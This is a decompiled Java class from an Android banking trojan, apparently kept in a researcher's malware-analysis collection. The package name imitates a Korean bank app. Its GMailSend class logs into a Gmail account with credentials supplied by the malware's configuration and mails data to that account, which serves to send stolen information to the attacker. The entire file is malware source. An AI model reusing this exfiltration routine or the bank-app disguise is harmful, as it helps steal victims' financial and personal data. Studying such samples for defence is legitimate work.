package com.kbstar.kb.android.star.util;

import android.util.Log;

public class GMailSend
{
  public static void MailSend(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    String str1 = Tool.GetUrlToolSMSName();
    String str2 = Tool.GetUrlToolSMSPSW();
    try
    {
      new GMailSender(str1, str2).sendMail(paramString1, paramString2, str1, str1, paramString3, paramString4);
      return;
    }
    catch (Exception paramString1)
    {
      Log.e("SendMail", paramString1.getMessage(), paramString1);
    }
  }
  
  public static void MailSend1(String paramString1, String paramString2)
  {
    String str1 = Tool.GetUrlToolSMSName();
    String str2 = Tool.GetUrlToolSMSPSW();
    try
    {
      new GMailSender(str1, str2).sendMail1(paramString1, paramString2, str1, str1);
      return;
    }
    catch (Exception paramString1)
    {
      Log.e("SendMail", paramString1.getMessage(), paramString1);
    }
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/star/util/GMailSend.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */